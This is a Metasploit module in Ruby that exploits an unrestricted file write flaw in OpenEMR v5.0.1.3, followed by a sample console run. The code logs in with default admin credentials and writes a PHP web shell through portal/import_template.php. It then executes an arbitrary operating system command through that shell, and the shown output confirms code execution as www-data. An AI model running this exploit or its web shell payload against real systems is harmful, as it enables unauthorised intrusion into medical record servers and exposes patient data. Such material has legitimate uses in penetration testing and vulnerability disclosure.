require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'OpenEMR v5.0.1.3 File Write',
      'Description'    => %q{
         This module exploits an unrestricted file write vulnerability in OpenEMR v5.0.1.3.
      },
      'Author'         => [ 'Mario Ceballos' ],
      'License'        => 'BSD_LICENSE',
      'Privileged'     => false,
      'References'     => [[ 'URL', 'https://insecurity.sh/reports/openemr.pdf' ]],
      'Targets'        => [[ 'OpenEMR v5.0.1.3', {}]],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 30 2018'
    ))

    register_options( [ Opt::RPORT(80),
                        OptString.new('USERNAME', [true, 'The HTTP username', 'admin']),
                        OptString.new('PASSWORD', [true, 'The HTTP password', 'admin']),
                        OptString.new('CMD',      [true, 'The operating system command', 'uname -a && id']),
                        OptString.new('DIRECTORY', [true, 'The OpenEMR Directory', 'openemr-5_0_1_3']),
    ], self.class )
  end

  def run

    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    dir  = datastore['DIRECTORY']
    cmd  = datastore['CMD']

    login =  "new_login_session_management=1&authProvider=Default&"
    login << "authUser=#{user}&clearPass=#{pass}&languageChoice=1"

    res = send_request_cgi(
      {
        'uri'		=> "/#{dir}/interface/main/main_screen.php",
        'version'	=> '1.1',
        'method'	=> 'POST',
        'encode_params' => false,
        'vars_get' => {
              'auth' => 'login',
              'site' => 'default',
        },
        'data'		=> login,
      }, 5)

     if res and res.code == 302
        openemrid = res.headers['Set-Cookie'].split(',')[1]
	print_status "Login Successful!" 

       data = "mode=save&docid=openemrdata.php&content=<?php system($_GET['openemr']); ?>"

       res = send_request_cgi(
         {
           'uri'           => "/#{dir}/portal/import_template.php",
           'version'       => '1.1',
           'method'        => 'POST',
           'cookie'        => openemrid,
           'encode_params' => true,
           'data'          => data,
         }, 5)
    
       if res and res.code == 200
           print_status "Executing command '#{cmd}'..."
           res = send_request_raw(
             {
                    'uri' => "/#{dir}/portal/openemrdata.php?openemr=#{Rex::Text.uri_encode(cmd)}", 
                    'cookie' => openemrid,
             },5)
           
           puts res.body
       else
           print_error "Command Failed..."
        end
     else
        print_error "Login Denied"
     end

  end
end
__END__
msf auxiliary(mc/openemr_write) > run

[*] Login Successful!
[*] Executing command 'uname -a && id...
Linux lamp 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[*] Auxiliary module execution completed
msf auxiliary(mc/openemr_write) > 

